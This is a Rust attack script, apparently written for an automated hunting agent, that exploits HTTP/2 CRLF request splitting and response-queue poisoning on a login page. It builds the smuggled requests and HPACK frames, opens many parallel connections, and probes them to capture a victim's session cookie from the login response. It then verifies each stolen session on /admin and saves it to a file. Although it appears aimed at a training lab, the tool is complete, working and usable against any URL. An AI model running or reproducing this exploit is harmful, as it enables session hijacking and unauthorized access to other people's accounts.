#!/usr/bin/env rust-script
//! name: h2split_login
//! description: H2 CRLF request-splitting login/RQP driver - splits the front-end request via a CRLF-injected header value; --mode surplus (default, --cl 36) sizes the smuggled request body to exactly the front-end's own appended tail, so the victim's request stays a clean request the backend answers and its login 302 + Set-Cookie becomes the response-queue surplus that our next probe on the same client connection receives; --mode hungry (--cl past the tail) instead lets the victim's credential-bearing bytes fill the smuggled body (request-side login-splitting). Reports every probe response (status/Location/Set-Cookie/snippet) and verifies any captured session on the admin path.
//! version: 1.0.0
//! args: <base-url> [--cookie S] [--mode surplus|hungry] [--cl N] [--cl-range LO-HI] [--path /login] [--rounds N] [--gap-ms N] [--probes N] [--probe-path /] [--probe-gap-ms N] [--read-ms N] [--cross-probe] [--check-path /admin] [--out JAR] [--selftest]
//! keywords: hunter, h2, http2, crlf, request-splitting, request-smuggling, response-queue-poisoning, login-splitting, session-theft, hpack
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! rustls = { version = "0.23", default-features = false, features = ["ring", "logging", "std", "tls12"] }
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::client::TlsStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

const PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
/// The front-end appends this after the injected header value on every downgraded
/// request (`\r\nVia: proxy1\r\nContent-Length: 0\r\n\r\n`), exactly as observed in a
/// captured comment window. Sizing the smuggled body to this makes the split clean.
const FRONTEND_TAIL: usize = 36;

struct Opts {
    host: String,
    port: u16,
    cookie: String,
    mode: String,
    cl: usize,
    cl_range: Option<(usize, usize)>,
    path: String,
    rounds: u32,
    burst: u32,
    gap_ms: u64,
    harvest: u32,
    probes: u32,
    probe_path: String,
    probe_gap_ms: u64,
    read_ms: u64,
    cross_probe: bool,
    check_path: String,
    out: Option<String>,
}

#[tokio::main]
async fn main() {
    let _ = rustls::crypto::ring::default_provider().install_default();
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let s = build_smuggled("h", "session=abc", 36, "/login");
        let ok = s.starts_with("POST /login HTTP/1.1\r\n")
            && s.contains("Cookie: session=abc\r\n")
            && s.contains("Content-Length: 36\r\n")
            && s.ends_with("\r\n\r\n")
            && FRONTEND_TAIL == 36
            && inject(&s) == format!("x\r\n\r\n{s}");
        pi_rust_lib::report::success(
            "h2split_login",
            json!({"selftest": if ok { "ok" } else { "fail" }, "smuggled": s, "tail": FRONTEND_TAIL}),
            "run against the target base url",
        )
        .unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }

    let mut base = String::new();
    let mut o = Opts {
        host: String::new(),
        port: 443,
        cookie: String::new(),
        mode: "surplus".to_string(),
        cl: FRONTEND_TAIL,
        cl_range: None,
        path: "/login".to_string(),
        rounds: 12,
        burst: 12,
        gap_ms: 11000,
        harvest: 0,
        probes: 6,
        probe_path: "/".to_string(),
        probe_gap_ms: 700,
        read_ms: 900,
        cross_probe: false,
        check_path: "/admin".to_string(),
        out: None,
    };
    let mut i = 0;
    while i < args.len() {
        let n = args.get(i + 1).cloned();
        match args[i].as_str() {
            "--cookie" => { o.cookie = n.unwrap_or(o.cookie); i += 1; }
            "--mode" => { o.mode = n.unwrap_or(o.mode); i += 1; }
            "--cl" => { o.cl = n.and_then(|v| v.parse().ok()).unwrap_or(o.cl); i += 1; }
            "--cl-range" => {
                if let Some(v) = n {
                    let mut it = v.split('-');
                    let lo = it.next().and_then(|x| x.trim().parse::<usize>().ok());
                    let hi = it.next().and_then(|x| x.trim().parse::<usize>().ok());
                    if let (Some(a), Some(b)) = (lo, hi) {
                        o.cl_range = Some((a, b));
                    }
                }
                i += 1;
            }
            "--path" => { o.path = n.unwrap_or(o.path); i += 1; }
            "--rounds" => { o.rounds = n.and_then(|v| v.parse().ok()).unwrap_or(o.rounds).max(1); i += 1; }
            "--burst" => { o.burst = n.and_then(|v| v.parse().ok()).unwrap_or(o.burst).max(1); i += 1; }
            "--gap-ms" => { o.gap_ms = n.and_then(|v| v.parse().ok()).unwrap_or(o.gap_ms); i += 1; }
            "--harvest" => { o.harvest = n.and_then(|v| v.parse().ok()).unwrap_or(o.harvest); i += 1; }
            "--probes" => { o.probes = n.and_then(|v| v.parse().ok()).unwrap_or(o.probes); i += 1; }
            "--probe-path" => { o.probe_path = n.unwrap_or(o.probe_path); i += 1; }
            "--probe-gap-ms" => { o.probe_gap_ms = n.and_then(|v| v.parse().ok()).unwrap_or(o.probe_gap_ms); i += 1; }
            "--read-ms" => { o.read_ms = n.and_then(|v| v.parse().ok()).unwrap_or(o.read_ms); i += 1; }
            "--cross-probe" => { o.cross_probe = true; }
            "--check-path" => { o.check_path = n.unwrap_or(o.check_path); i += 1; }
            "--out" => { o.out = n; i += 1; }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure(
            "h2split_login",
            "missing base url",
            "call as: h2split_login <base-url> [--mode surplus] [--cl 36] [--rounds 12] [--out JAR]",
        );
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    o.host = parsed.host_str().unwrap_or("").to_string();
    o.port = parsed.port().unwrap_or(443);
    if o.mode == "hungry" && o.cl == FRONTEND_TAIL {
        o.cl = FRONTEND_TAIL + 400;
    }

    let budget: f64 = std::env::var("PI_TIMEOUT_SECS").ok().and_then(|v| v.parse().ok()).unwrap_or(300.0);
    match tokio::time::timeout(Duration::from_secs_f64(budget), run(&o)).await {
        Ok(Ok(data)) => {
            let next = if data["captured"].is_object() {
                "session captured -> http_session with the written jar to reach /admin and delete carlos"
            } else {
                "no victim response caught: widen --rounds / tune --cl (surplus=36) / try --mode hungry"
            };
            pi_rust_lib::report::success("h2split_login", data, next).unwrap_or(());
        }
        Ok(Err(e)) => {
            pi_rust_lib::report::failure("h2split_login", &e, "check the base url / the target surface");
            std::process::exit(1);
        }
        Err(_) => {
            pi_rust_lib::report::failure("h2split_login", &format!("deadline {budget}s reached"), "lower --rounds / --gap-ms");
            std::process::exit(1);
        }
    }
}

fn build_smuggled(host: &str, cookie: &str, cl: usize, path: &str) -> String {
    let mut s = format!("POST {path} HTTP/1.1\r\nHost: {host}\r\n");
    if !cookie.is_empty() {
        s.push_str(&format!("Cookie: {cookie}\r\n"));
    }
    s.push_str(&format!("Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {cl}\r\n\r\n"));
    s
}

fn inject(smuggled: &str) -> String {
    format!("x\r\n\r\n{smuggled}")
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}

fn tls_config(alpn: &[&[u8]]) -> Arc<ClientConfig> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut cfg = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    cfg.alpn_protocols = alpn.iter().map(|p| p.to_vec()).collect();
    Arc::new(cfg)
}

async fn h2_connect(cfg: Arc<ClientConfig>, host: &str, port: u16) -> Result<TlsStream<TcpStream>, String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))?;
    tls.write_all(PREFACE).await.map_err(|e| format!("preface: {e}"))?;
    tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(tls)
}

async fn send_stream(
    tls: &mut TlsStream<TcpStream>,
    sid: u32,
    host: &str,
    path: &str,
    extra: &[(Vec<u8>, Vec<u8>)],
) -> Result<(), String> {
    let mut headers: Vec<(Vec<u8>, Vec<u8>)> = vec![
        (b":method".to_vec(), b"GET".to_vec()),
        (b":scheme".to_vec(), b"https".to_vec()),
        (b":authority".to_vec(), host.as_bytes().to_vec()),
        (b":path".to_vec(), path.as_bytes().to_vec()),
    ];
    for (n, v) in extra {
        headers.push((n.clone(), v.clone()));
    }
    let block = hpack::Encoder::new().encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
    tls.write_all(&frame(1, 0x5, sid, &block)).await.map_err(|e| format!("headers: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(())
}

#[derive(Default, Clone)]
struct Row {
    sid: u32,
    status: Option<String>,
    location: Option<String>,
    set_cookies: Vec<String>,
    body_len: usize,
    snippet: String,
}

fn row_for(rows: &mut Vec<Row>, sid: u32) -> &mut Row {
    if let Some(pos) = rows.iter().position(|r| r.sid == sid) {
        &mut rows[pos]
    } else {
        rows.push(Row { sid, ..Default::default() });
        rows.last_mut().unwrap()
    }
}

/// Read frames until the idle window closes (or EOF), keeping one HPACK decoder per
/// connection so the dynamic table stays in sync; every stream's headers/body is kept.
async fn read_all(tls: &mut TlsStream<TcpStream>, dec: &mut hpack::Decoder<'_>, idle_ms: u64) -> Vec<Row> {
    let mut rows: Vec<Row> = Vec::new();
    let idle = Duration::from_millis(idle_ms.max(200));
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, tls.read_exact(&mut hdr)).await {
            Err(_) => break,
            Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let flen = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; flen];
        if flen > 0 && tokio::time::timeout(idle, tls.read_exact(&mut payload)).await.is_err() {
            break;
        }
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = tls.flush().await;
                }
            }
            6 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(6, 0x1, 0, &payload)).await;
                    let _ = tls.flush().await;
                }
            }
            1 | 9 => {
                if sid == 0 {
                    continue;
                }
                if let Ok(hs) = dec.decode(&payload) {
                    let row = row_for(&mut rows, sid);
                    for h in hs.iter() {
                        let n: &[u8] = &h.0;
                        let v: &[u8] = &h.1;
                        if n == b":status" {
                            row.status = Some(String::from_utf8_lossy(v).to_string());
                        } else if n.eq_ignore_ascii_case(b"location") {
                            row.location = Some(String::from_utf8_lossy(v).to_string());
                        } else if n.eq_ignore_ascii_case(b"set-cookie") {
                            row.set_cookies.push(String::from_utf8_lossy(v).to_string());
                        }
                    }
                }
            }
            0 => {
                if sid == 0 {
                    continue;
                }
                let row = row_for(&mut rows, sid);
                row.body_len += payload.len();
                if row.snippet.len() < 140 {
                    row.snippet.push_str(&String::from_utf8_lossy(&payload));
                }
            }
            _ => {}
        }
    }
    rows
}

fn alnum_run_after(s: &str, idx: usize) -> String {
    let mut out = String::new();
    for c in s[idx..].chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
            out.push(c);
        } else {
            break;
        }
    }
    out
}

fn cookie_value(set_cookie: &str, name: &str) -> Option<String> {
    let needle = format!("{name}=");
    let idx = set_cookie.find(&needle)?;
    let v = alnum_run_after(set_cookie, idx + needle.len());
    if v.is_empty() {
        None
    } else {
        Some(v)
    }
}

fn session_from(set_cookies: &[String]) -> Option<String> {
    set_cookies.iter().find_map(|c| cookie_value(c, "session"))
}

async fn h1_request(
    cfg: Arc<ClientConfig>,
    host: &str,
    port: u16,
    method: &str,
    path: &str,
    body: Option<&str>,
    cookie: Option<&str>,
) -> Result<(u16, String, Vec<String>), String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))?;
    let mut req = format!("{method} {path} HTTP/1.1\r\nHost: {host}\r\nAccept: */*\r\nConnection: close\r\n");
    if let Some(c) = cookie {
        req.push_str(&format!("Cookie: {c}\r\n"));
    }
    if let Some(b) = body {
        req.push_str(&format!("Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n", b.len()));
    }
    req.push_str("\r\n");
    if let Some(b) = body {
        req.push_str(b);
    }
    tls.write_all(req.as_bytes()).await.map_err(|e| format!("write: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    let mut buf = Vec::new();
    let _ = tokio::time::timeout(Duration::from_secs(12), tls.read_to_end(&mut buf)).await;
    let text = String::from_utf8_lossy(&buf).to_string();
    let (head, resp_body) = match text.split_once("\r\n\r\n") {
        Some((h, b)) => (h.to_string(), b.to_string()),
        None => (text.clone(), String::new()),
    };
    let mut lines = head.lines();
    let status = lines.next().and_then(|l| l.split_whitespace().nth(1)).and_then(|s| s.parse::<u16>().ok()).unwrap_or(0);
    let set_cookies: Vec<String> = lines
        .filter(|l| l.to_ascii_lowercase().starts_with("set-cookie:"))
        .map(|l| l[11..].trim().to_string())
        .collect();
    Ok((status, resp_body, set_cookies))
}

async fn round(o: &Opts, cl: usize, round_no: u32) -> Result<Value, String> {
    let smuggled = build_smuggled(&o.host, &o.cookie, cl, &o.path);
    let inj = inject(&smuggled);

    // Arm `burst` independent upstream connections in parallel: each split leaves one
    // response (the smuggled request's) pending in its socket, so whichever of them the
    // front-end hands the victim's next request to will hold the victim's own response
    // (login 302 + Set-Cookie) for whoever probes it next.
    type Arm = (TlsStream<TcpStream>, hpack::Decoder<'static>);
    let mut arms: Vec<Arm> = Vec::new();
    let mut arm_rows: Vec<Value> = Vec::new();
    let mut hit_sessions: Vec<String> = Vec::new();
    let mut hits: Vec<Value> = Vec::new();
    for b in 1..=o.burst {
        let mut tls = h2_connect(tls_config(&[b"h2"]), &o.host, o.port).await?;
        let mut dec = hpack::Decoder::new();
        send_stream(&mut tls, 1, &o.host, "/", &[(b"x-arm".to_vec(), inj.clone().into_bytes())]).await?;
        let rows = read_all(&mut tls, &mut dec, o.read_ms).await;
        // The arm's own response can already be a stale one: the front-end may hand the
        // request to an upstream still holding a previous round's mispaired response.
        for r in rows.iter() {
            let three = r.status.as_deref().map(|s| s.starts_with('3')).unwrap_or(false);
            arm_rows.push(json!({
                "arm": b, "sid": r.sid, "status": r.status, "location": r.location,
                "set_cookies": r.set_cookies, "body_len": r.body_len,
                "snippet": r.snippet.chars().take(120).collect::<String>(),
            }));
            if three || r.location.is_some() {
                if let Some(s) = session_from(&r.set_cookies) {
                    if !hit_sessions.contains(&s) {
                        hit_sessions.push(s.clone());
                    }
                }
                hits.push(json!({
                    "src": "arm", "arm": b, "sid": r.sid, "status": r.status,
                    "location": r.location, "set_cookies": r.set_cookies,
                    "body_len": r.body_len,
                    "snippet": r.snippet.chars().take(200).collect::<String>(),
                }));
            }
        }
        arms.push((tls, dec));
    }

    // Quiet window: the victim logs in roughly every 10s and its request is routed onto
    // one of the armed upstreams, whose pending response then lands in the victim's lap.
    tokio::time::sleep(Duration::from_millis(o.gap_ms)).await;

    let mut probe_statuses: std::collections::BTreeMap<String, u32> = std::collections::BTreeMap::new();
    for (i, (tls, dec)) in arms.iter_mut().enumerate() {
        for p in 0..o.probes {
            let sid = 3 + p * 2;
            if send_stream(tls, sid, &o.host, &o.probe_path, &[(b"x-p".to_vec(), b"p".to_vec())]).await.is_err() {
                break;
            }
            let rows = read_all(tls, dec, o.read_ms).await;
            for r in rows.iter() {
                *probe_statuses.entry(r.status.clone().unwrap_or_else(|| "none".into())).or_insert(0) += 1;
                let three = r.status.as_deref().map(|s| s.starts_with('3')).unwrap_or(false);
                if three || r.location.is_some() {
                    if let Some(s) = session_from(&r.set_cookies) {
                        if !hit_sessions.contains(&s) {
                            hit_sessions.push(s.clone());
                        }
                    }
                    hits.push(json!({
                        "src": "probe", "arm": i + 1, "probe": p, "sid": r.sid,
                        "status": r.status, "location": r.location,
                        "set_cookies": r.set_cookies,
                        "body_len": r.body_len,
                        "snippet": r.snippet.chars().take(200).collect::<String>(),
                    }));
                }
            }
            if p + 1 < o.probes {
                tokio::time::sleep(Duration::from_millis(o.probe_gap_ms)).await;
            }
        }
    }
    drop(arms);

    // Harvest phase: fresh connections after the window. Every request may be handed to
    // any pooled upstream, including one still carrying a mispaired victim response.
    let mut harvest_hist: std::collections::BTreeMap<String, u32> = std::collections::BTreeMap::new();
    for h in 0..o.harvest {
        let mut tls = h2_connect(tls_config(&[b"h2"]), &o.host, o.port).await?;
        let mut dec = hpack::Decoder::new();
        if send_stream(&mut tls, 1, &o.host, &o.probe_path, &[(b"x-h".to_vec(), b"h".to_vec())]).await.is_err() {
            continue;
        }
        let rows = read_all(&mut tls, &mut dec, o.read_ms).await;
        for r in rows.iter() {
            *harvest_hist.entry(r.status.clone().unwrap_or_else(|| "none".into())).or_insert(0) += 1;
            let three = r.status.as_deref().map(|s| s.starts_with('3')).unwrap_or(false);
            if three || r.location.is_some() {
                if let Some(s) = session_from(&r.set_cookies) {
                    if !hit_sessions.contains(&s) {
                        hit_sessions.push(s.clone());
                    }
                }
                hits.push(json!({
                    "src": "harvest", "h": h, "sid": r.sid, "status": r.status,
                    "location": r.location, "set_cookies": r.set_cookies,
                    "body_len": r.body_len,
                    "snippet": r.snippet.chars().take(200).collect::<String>(),
                }));
            }
        }
        drop(tls);
        if h + 1 < o.harvest {
            tokio::time::sleep(Duration::from_millis(o.probe_gap_ms.max(50))).await;
        }
    }

    Ok(json!({
        "round": round_no,
        "cl": cl,
        "smuggled_len": smuggled.len(),
        "burst": o.burst,
        "arm_rows": arm_rows,
        "probe_status_hist": probe_statuses,
        "harvest_status_hist": harvest_hist,
        "hits": hits,
        "hit_sessions": hit_sessions,
    }))
}

async fn run(o: &Opts) -> Result<Value, String> {
    let h1 = tls_config(&[b"http/1.1"]);
    let budget: f64 = std::env::var("PI_TIMEOUT_SECS").ok().and_then(|v| v.parse().ok()).unwrap_or(300.0);
    let deadline = Instant::now() + Duration::from_secs_f64((budget - 20.0).max(20.0));

    // Seed our own session (the smuggled request presents it in --mode hungry).
    let (seed_status, _seed_body, seed_cookies) = h1_request(h1.clone(), &o.host, o.port, "GET", "/", None, None).await?;
    let mut cookie = if o.cookie.is_empty() {
        session_from(&seed_cookies).map(|s| format!("session={s}")).unwrap_or_default()
    } else {
        o.cookie.clone()
    };
    if cookie.is_empty() {
        return Err(format!("no session cookie from / (status {seed_status})"));
    }

    let mut rounds: Vec<Value> = Vec::new();
    let mut captured: Option<Value> = None;
    let mut r = 1u32;
    loop {
        if Instant::now() >= deadline || r > o.rounds {
            break;
        }
        let cl = match o.cl_range {
            Some((lo, hi)) => {
                let span = hi.saturating_sub(lo).saturating_add(1).max(1);
                lo + ((r as usize - 1) % span)
            }
            None => o.cl,
        };
        match round(o, cl, r).await {
            Ok(v) => {
                let cands: Vec<String> = v["hit_sessions"]
                    .as_array()
                    .map(|a| a.iter().filter_map(|x| x.as_str().map(|s| s.to_string())).collect())
                    .unwrap_or_default();
                for s in cands {
                    if let Ok((st, body, _)) =
                        h1_request(h1.clone(), &o.host, o.port, "GET", &o.check_path, None, Some(&format!("session={s}"))).await
                    {
                        if st == 200 && body.contains("carlos") {
                            captured = Some(json!({"session": s, "verify_status": st, "round": r}));
                            cookie = format!("session={s}");
                            if let Some(p) = &o.out {
                                let _ = std::fs::write(p, json!({ o.host.clone(): { "session": s } }).to_string());
                            }
                            break;
                        }
                    }
                }
                rounds.push(v);
                if captured.is_some() {
                    break;
                }
            }
            Err(e) => rounds.push(json!({"round": r, "cl": cl, "error": e})),
        }
        r += 1;
    }

    // Did the armed login turn our own session admin in place (no response needed)?
    let mut in_place = json!({"checked": false});
    let armed = format!("session={}", cookie.trim_start_matches("session="));
    if let Ok((st, body, _)) = h1_request(h1.clone(), &o.host, o.port, "GET", &o.check_path, None, Some(&armed)).await {
        in_place = json!({"checked": true, "status": st, "has_carlos": body.contains("carlos")});
    }

    Ok(json!({
        "host": o.host,
        "mode": o.mode,
        "cl": o.cl,
        "cl_range": o.cl_range.map(|(a, b)| format!("{a}-{b}")),
        "gap_ms": o.gap_ms,
        "probes": o.probes,
        "rounds_run": rounds.len(),
        "rounds": rounds,
        "captured": captured,
        "own_session_in_place": in_place,
        "jar": o.out,
    }))
}
